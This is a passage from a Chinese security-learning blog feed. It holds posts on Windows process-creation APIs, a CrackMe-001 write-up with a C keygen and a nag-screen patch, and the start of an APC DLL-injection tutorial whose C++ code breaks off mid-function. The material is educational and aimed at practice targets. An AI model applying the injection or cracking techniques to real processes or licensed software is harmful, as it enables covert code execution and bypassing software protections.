td><td>找不到指定的路径</td></tr></tbody></table><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE hInstance = ShellExecute(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestApc.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_NORMAL);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)hInstance &lt;= <span class="number">32</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建成功\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/1.png"></p><h5 id="ShellExecute函数"><a href="#ShellExecute函数" class="headerlink" title="ShellExecute函数"></a>ShellExecute函数</h5><p>对指定文件执行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE ShellExecuteA(</span><br><span class="line">  HWND   hwnd,</span><br><span class="line">  LPCSTR lpOperation,</span><br><span class="line">  LPCSTR lpFile,</span><br><span class="line">  LPCSTR lpParameters,</span><br><span class="line">  LPCSTR lpDirectory,</span><br><span class="line">  INT    nShowCmd</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。</p><p>lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有：</p><ul><li>edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。</li><li>explore：探索由lpFile指定的文件夹。</li><li>find：在由lpDirectory指定的目录中启动搜索。</li><li>open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。</li><li>print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。</li><li>NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。</li></ul><p>lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。</p><p>lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。</p><p>lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。</p><p>nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。</p><p>返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE hInstance = ShellExecute(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestApc.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_NORMAL);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)hInstance &lt;= <span class="number">32</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute创建成功\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行程序提示创建成功，同时TestAPC被成功创建。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/2.png"></p><h5 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h5><p>创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL CreateProcess(</span><br><span class="line">  LPCSTR                lpApplicationName,</span><br><span class="line">  LPSTR                 lpCommandLine,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">  BOOL                  bInheritHandles,</span><br><span class="line">  DWORD                 dwCreationFlags,</span><br><span class="line">  LPVOID                lpEnvironment,</span><br><span class="line">  LPCSTR                lpCurrentDirectory,</span><br><span class="line">  LPSTARTUPINFOA        lpStartupInfo,</span><br><span class="line">  LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。</p><p>lpCommandLine：要执行的命令行。</p><p>lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果<em>lpProcessAttributes</em>为NULL，则不能继承句柄。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果<em>lpThreadAttributes</em>为 NULL，则不能继承句柄。</p><p>bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。</p><p>dwCreationFlags：控制优先级类和进程创建的标志。</p><p>lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。</p><p>lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。</p><p>lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。</p><p>lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。</p><p>返回值：如果函数成功，则返回值非0；若失败，则返回值为0。</p><p>具体代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">si.wShowWindow = SW_NORMAL;</span><br><span class="line">BOOL flag = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestApc.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess创建成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess创建失败\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行之后，即可成功创建TestAPC进程。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;创建进程API&quot;&gt;&lt;a href=&quot;#创建进程API&quot; class=&quot;headerlink&quot; title=&quot;创建进程API&quot;&gt;&lt;/a&gt;创建进程API&lt;/h4&gt;&lt;p&gt;在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="启动技术" scheme="https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe--001</title>
    <link href="https://b1ack1e.github.io/2021/07/14/160CrackMe-001/"/>
    <id>https://b1ack1e.github.io/2021/07/14/160CrackMe-001/</id>
    <published>2021-07-14T02:23:13.000Z</published>
    <updated>2021-07-14T06:50:17.951Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。</p><p><img src="/2021/07/14/160CrackMe-001/1.png"></p><p>程序主题界面有两部分，第一部分是序列号加名字。</p><p><img src="/2021/07/14/160CrackMe-001/2.png"></p><p>第二部分是单纯的序列号，应该是比较简单。</p><p><img src="/2021/07/14/160CrackMe-001/3.png"></p><p>看完大体流程，开始分析。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。</p><p><img src="/2021/07/14/160CrackMe-001/4.png"></p><h5 id="先分析单纯的序列号。"><a href="#先分析单纯的序列号。" class="headerlink" title="先分析单纯的序列号。"></a>先分析单纯的序列号。</h5><p>用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。</p><p><img src="/2021/07/14/160CrackMe-001/5.png"></p><p>在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。</p><p><img src="/2021/07/14/160CrackMe-001/6.png"></p><p><img src="/2021/07/14/160CrackMe-001/7.png"></p><p>那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。</p><p><img src="/2021/07/14/160CrackMe-001/8.png"></p><h5 id="再来分析序列号加用户名"><a href="#再来分析序列号加用户名" class="headerlink" title="再来分析序列号加用户名"></a>再来分析序列号加用户名</h5><p>还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。</p><p><img src="/2021/07/14/160CrackMe-001/10.png"></p><p>首先是检测了输入的用户名长度，不可以小于4位。</p><p><img src="/2021/07/14/160CrackMe-001/9.png"></p><p>继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。</p><p><img src="/2021/07/14/160CrackMe-001/11.png"></p><p>数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。</p><p><img src="/2021/07/14/160CrackMe-001/12.png"></p><p>到这里整个过程就分析了，开始尝试编写注册机</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt; stdio.h &gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;corecrt_malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入大于四位的用户名\n&quot;</span>);</span><br><span class="line">    gets_s(Name, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> Num;</span><br><span class="line">    Num = (Name[<span class="number">0</span>] * <span class="number">0x29</span>) * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">char</span>* s1=<span class="string">&quot;CW&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* s2 = <span class="string">&quot;CRACKED&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* s3= <span class="string">&quot;-&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* serial = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(serial, <span class="string">&quot;%s%s%d%s%s&quot;</span>, s1, s3, Num, s3, s2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;用户名是：%s\nserial是：%s&quot;</span>, Name, serial);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入用户名b1ackie，就可以计算出正确的serial。</p><p><img src="/2021/07/14/160CrackMe-001/13.png"></p><p>输入正确的值查看</p><p><img src="/2021/07/14/160CrackMe-001/14.png"></p><h4 id="弹窗的消除"><a href="#弹窗的消除" class="headerlink" title="弹窗的消除"></a>弹窗的消除</h4><p>先根据弹窗的提示信息，搜索字符串，可以定位到此处。</p><p><img src="/2021/07/14/160CrackMe-001/15.png"></p><p>执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。</p><p><img src="/2021/07/14/160CrackMe-001/16.png"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。</p><p>还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/14/160Cr</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>注入技术-APC注入</title>
    <link href="https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-13T07:25:36.000Z</published>
    <updated>2021-07-27T08:46:34.144Z</updated>
    
    <content type="html"><![CDATA[<h4 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h4><p>APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h5><p>将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD QueueUserAPC(</span><br><span class="line">  PAPCFUNC  pfnAPC,</span><br><span class="line">  HANDLE    hThread,</span><br><span class="line">  ULONG_PTR dwData</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。</p><p>hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。</p><p>dwData：传递由pfnAPC参数指向的APC函数的单个值。</p><p>返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。</p><h5 id="具体代码如下："><a href="#具体代码如下：" class="headerlink" title="具体代码如下："></a>具体代码如下：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlconv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlstr.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPidByName</span><span class="params">(<span class="keyword">char</span>* pszProcessName)</span> </span>&#123;</span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 PE32 = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(PE32) &#125;;</span><br><span class="line">    USES_CONVERSION;</span><br><span class="line">    CString ProcessName = <span class="built_in">A2T</span>(pszProcessName);</span><br><span class="line">    BOOL flag = <span class="built_in">Process32First</span>(hSnap, &amp;PE32);</span><br><span class="line">    <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">lstrcmp</span>(PE32.szExeFile, ProcessName) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PE32.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = <span class="built_in">Process32Next</span>(hSnap, &amp;PE32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD* pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThreadIdLength = <span class="number">0</span>;</span><br><span class="line">    DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">    THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = TRUE;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 申请内存</span></span><br><span class="line">        pThreadId = <span class="keyword">new</span> DWORD[dwBufferLength];</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == pThreadId)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(pThreadId, (dwBufferLength * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)));</span><br><span class="line">        <span class="comment">// 获取线程快照</span></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(&amp;te32, <span class="built_in"><span class="keyword">sizeof</span></span>(te32));</span><br><span class="line">        te32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(te32);</span><br><span class="line">        hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == hSnapshot)</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取第一条线程快照信息</span></span><br><span class="line">        bRet = <span class="built_in">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class="line">        <span class="keyword">while</span> (bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取进程对应的线程ID</span></span><br><span class="line">            <span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)</span><br><span class="line">            &#123;</span><br><span class="line">                pThreadId[dwThreadIdLength] = te32.th32ThreadID;</span><br><span class="line">                dwThreadIdLength++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历下一个线程快照信息</span></span><br><span class="line">            bRet = <span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回</span></span><br><span class="line">        *ppThreadId = pThreadId;</span><br><span class="line">        *pdwThreadIdLength = dwThreadIdLength;</span><br><span class="line">        bRet = TRUE;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pThreadId)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">delete</span>[]pThreadId;</span><br><span class="line">            pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(<span class="keyword">char</span>* pszProcessName, <span class="keyword">char</span>* pszDllname)</span> </span>&#123;</span><br><span class="line">    BOOL flag = FALSE;</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">    DWORD* pThreadId = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThreadLength = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pBaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pLoadLibraryFunc = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T dwRet = <span 